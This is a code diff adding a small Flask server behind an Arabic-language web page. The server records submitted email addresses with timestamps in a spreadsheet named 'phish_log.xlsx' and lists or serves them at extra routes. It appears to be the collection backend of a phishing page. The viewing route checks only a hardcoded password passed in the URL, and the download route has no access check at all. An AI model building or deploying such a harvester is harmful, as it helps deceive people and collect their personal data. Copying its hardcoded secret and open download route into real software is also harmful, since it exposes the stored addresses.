@@ -1,4 +1,18 @@
+from flask import Flask, request, send_file, render_template_string
+import pandas as pd
+from datetime import datetime
+import os
 
+app = Flask(__name__)
+
+LOG_FILE = "phish_log.xlsx"
+
+# إنشاء الملف لو لم يكن موجود
+if not os.path.exists(LOG_FILE):
+    df = pd.DataFrame(columns=["Timestamp", "Email"])
+    df.to_excel(LOG_FILE, index=False)
+
+HTML = '''
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -87,3 +101,40 @@
 </body>
 </html>
 '''
+
+@app.route("/", methods=["GET", "POST"])
+def home():
+    email = None
+    if request.method == "POST":
+        email = request.form.get("email")
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        try:
+            df = pd.read_excel(LOG_FILE)
+        except Exception:
+            df = pd.DataFrame(columns=["Timestamp", "Email"])
+        df = pd.concat([df, pd.DataFrame([[timestamp, email]], columns=df.columns)], ignore_index=True)
+        df.to_excel(LOG_FILE, index=False)
+    return render_template_string(HTML, email=email)
+
+# صفحة عرض الإيميلات المحمية بكلمة مرور
+@app.route("/submissions")
+def submissions():
+    password = request.args.get("pass")
+    if password != "mysecret123":
+        return "Unauthorized", 403
+    if os.path.exists(LOG_FILE):
+        df = pd.read_excel(LOG_FILE)
+        return df.to_html(index=False)
+    else:
+        return "No submissions yet!"
+
+@app.route("/download-log")
+def download_log():
+    if os.path.exists(LOG_FILE):
+        return send_file(LOG_FILE, as_attachment=True)
+    else:
+        return "File not found!", 404
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
